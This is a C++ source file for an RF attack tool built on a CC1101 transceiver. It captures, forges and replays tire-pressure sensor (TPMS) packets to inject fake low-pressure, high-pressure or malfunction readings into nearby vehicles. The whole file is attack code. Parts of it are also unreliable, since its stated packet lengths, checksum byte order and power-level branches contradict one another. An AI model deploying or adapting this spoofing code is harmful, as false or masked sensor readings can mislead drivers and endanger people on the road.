#include "VehicleDiagnosticsAttack.h"

VehicleDiagnosticsAttack::VehicleDiagnosticsAttack()
{
    signalProcessor = new RFSignalProcessor();
    currentProtocol = nullptr;
}

VehicleDiagnosticsAttack::~VehicleDiagnosticsAttack()
{
    delete signalProcessor;
}

bool VehicleDiagnosticsAttack::init(const Config &config)
{
    this->config = config;

    // Initialize CC1101 with TPMS specific settings
    ELECHOUSE_CC1101.Init();
    ELECHOUSE_CC1101.setModulation(config.modulation);
    ELECHOUSE_CC1101.setMHZ(config.frequency);
    ELECHOUSE_CC1101.SetTx();

    // Add common TPMS protocols
    VehicleProtocol schrader = {
        "Schrader",
        315000000,          // 315MHz
        2,                  // FSK
        19200,              // 19.2kbps
        {0xAA, 0xAA, 0xAA}, // Preamble
        8                   // 8-byte packets
    };
    addProtocol(schrader);

    VehicleProtocol continental = {
        "Continental",
        433920000,          // 433.92MHz
        2,                  // FSK
        19200,              // 19.2kbps
        {0x55, 0x55, 0x55}, // Preamble
        10                  // 10-byte packets
    };
    addProtocol(continental);

    return true;
}

bool VehicleDiagnosticsAttack::startCapture()
{
    if (!signalProcessor->startListening(config.frequency))
    {
        return false;
    }
    return true;
}

bool VehicleDiagnosticsAttack::stopCapture()
{
    signalProcessor->stopListening();
    return true;
}

bool VehicleDiagnosticsAttack::injectTPMSData(const TPMSData &data)
{
    if (!currentProtocol)
    {
        if (!detectVehicleProtocol())
        {
            return false;
        }
    }

    std::vector<uint8_t> packet;
    if (!encodeTPMSPacket(data, packet))
    {
        return false;
    }

    optimizeSignalStrength();
    return transmitPacket(packet);
}

bool VehicleDiagnosticsAttack::detectVehicleProtocol()
{
    if (!config.autoDetectProtocol)
    {
        return false;
    }

    std::vector<uint8_t> signal;
    if (!signalProcessor->captureSignal(signal))
    {
        return false;
    }

    for (const auto &protocol : supportedProtocols)
    {
        if (signal.size() >= protocol.preamble.size())
        {
            bool match = true;
            for (size_t i = 0; i < protocol.preamble.size(); i++)
            {
                if (signal[i] != protocol.preamble[i])
                {
                    match = false;
                    break;
                }
            }
            if (match)
            {
                currentProtocol = const_cast<VehicleProtocol *>(&protocol);
                return true;
            }
        }
    }

    return false;
}

void VehicleDiagnosticsAttack::addProtocol(const VehicleProtocol &protocol)
{
    supportedProtocols.push_back(protocol);
}

bool VehicleDiagnosticsAttack::selectProtocol(const std::string &manufacturer)
{
    for (auto &protocol : supportedProtocols)
    {
        if (protocol.manufacturer == manufacturer)
        {
            currentProtocol = &protocol;
            return true;
        }
    }
    return false;
}

bool VehicleDiagnosticsAttack::analyzeSignal(std::vector<uint8_t> &signal)
{
    if (signal.empty())
    {
        return false;
    }

    if (!validatePacket(signal))
    {
        return false;
    }

    lastPacket = signal;
    return true;
}

float VehicleDiagnosticsAttack::validatePressureReading(float pressure)
{
    // Typical TPMS valid range: 0-100 PSI
    if (pressure < 0)
        return 0;
    if (pressure > 100)
        return 100;
    return pressure;
}

bool VehicleDiagnosticsAttack::verifyChecksum(const std::vector<uint8_t> &packet)
{
    if (packet.size() < 4)
        return false; // Minimum size for checksum

    uint32_t calculated = calculateChecksum(std::vector<uint8_t>(packet.begin(), packet.end() - 4));
    uint32_t received = *reinterpret_cast<const uint32_t *>(&packet[packet.size() - 4]);

    return calculated == received;
}

bool VehicleDiagnosticsAttack::simulateLowPressure(uint32_t sensorId)
{
    TPMSData data = {
        sensorId,
        15.0f, // 15 PSI - typically triggers warning
        25.0f, // Normal temperature
        90,    // Good battery level
        static_cast<uint32_t>(millis())};

    return injectTPMSData(data);
}

bool VehicleDiagnosticsAttack::simulateHighPressure(uint32_t sensorId)
{
    TPMSData data = {
        sensorId,
        45.0f, // 45 PSI - typically triggers warning
        30.0f, // Slightly elevated temperature
        90,    // Good battery level
        static_cast<uint32_t>(millis())};

    return injectTPMSData(data);
}

bool VehicleDiagnosticsAttack::simulateSensorMalfunction(uint32_t sensorId)
{
    TPMSData data = {
        sensorId,
        0.0f, // Zero pressure indicates malfunction
        0.0f, // Zero temperature
        10,   // Low battery
        static_cast<uint32_t>(millis())};

    return injectTPMSData(data);
}

bool VehicleDiagnosticsAttack::replayLastPacket()
{
    if (lastPacket.empty())
    {
        return false;
    }

    return transmitPacket(lastPacket);
}

bool VehicleDiagnosticsAttack::encodeTPMSPacket(const TPMSData &data, std::vector<uint8_t> &packet)
{
    if (!currentProtocol)
    {
        return false;
    }

    packet = currentProtocol->preamble;

    // Add sensor ID
    packet.push_back((data.sensorId >> 24) & 0xFF);
    packet.push_back((data.sensorId >> 16) & 0xFF);
    packet.push_back((data.sensorId >> 8) & 0xFF);
    packet.push_back(data.sensorId & 0xFF);

    // Add pressure (fixed point format)
    uint16_t pressureFixed = static_cast<uint16_t>(data.pressure * 100);
    packet.push_back((pressureFixed >> 8) & 0xFF);
    packet.push_back(pressureFixed & 0xFF);

    // Add temperature (fixed point format)
    uint16_t tempFixed = static_cast<uint16_t>((data.temperature + 50) * 100);
    packet.push_back((tempFixed >> 8) & 0xFF);
    packet.push_back(tempFixed & 0xFF);

    // Add battery level
    packet.push_back(data.battery);

    // Add timestamp
    packet.push_back((data.timestamp >> 24) & 0xFF);
    packet.push_back((data.timestamp >> 16) & 0xFF);
    packet.push_back((data.timestamp >> 8) & 0xFF);
    packet.push_back(data.timestamp & 0xFF);

    // Calculate and add checksum
    uint32_t checksum = calculateChecksum(packet);
    packet.push_back((checksum >> 24) & 0xFF);
    packet.push_back((checksum >> 16) & 0xFF);
    packet.push_back((checksum >> 8) & 0xFF);
    packet.push_back(checksum & 0xFF);

    return true;
}

bool VehicleDiagnosticsAttack::transmitPacket(const std::vector<uint8_t> &packet)
{
    if (!currentProtocol)
    {
        return false;
    }

    ELECHOUSE_CC1101.SetTx();

    // Send packet multiple times to ensure reception
    for (int i = 0; i < 3; i++)
    {
        ELECHOUSE_CC1101.SendData(packet.data(), packet.size());
        delay(50); // Short delay between transmissions
    }

    ELECHOUSE_CC1101.SetRx();
    return true;
}

uint32_t VehicleDiagnosticsAttack::calculateChecksum(const std::vector<uint8_t> &data)
{
    uint32_t crc = 0xFFFFFFFF;

    for (uint8_t byte : data)
    {
        crc ^= byte;
        for (int i = 0; i < 8; i++)
        {
            if (crc & 1)
            {
                crc = (crc >> 1) ^ 0xEDB88320;
            }
            else
            {
                crc >>= 1;
            }
        }
    }

    return ~crc;
}

bool VehicleDiagnosticsAttack::validatePacket(const std::vector<uint8_t> &packet)
{
    if (!currentProtocol)
    {
        return false;
    }

    // Check minimum packet size
    if (packet.size() < currentProtocol->packetLength)
    {
        return false;
    }

    // Verify preamble
    for (size_t i = 0; i < currentProtocol->preamble.size(); i++)
    {
        if (packet[i] != currentProtocol->preamble[i])
        {
            return false;
        }
    }

    // Verify checksum
    return verifyChecksum(packet);
}

void VehicleDiagnosticsAttack::optimizeSignalStrength()
{
    // Start with maximum power
    ELECHOUSE_CC1101.setPa(12);

    // Adjust based on config
    if (config.minSignalStrength < 8)
    {
        ELECHOUSE_CC1101.setPa(8); // Medium power
    }
    else if (config.minSignalStrength < 4)
    {
        ELECHOUSE_CC1101.setPa(4); // Low power
    }
}
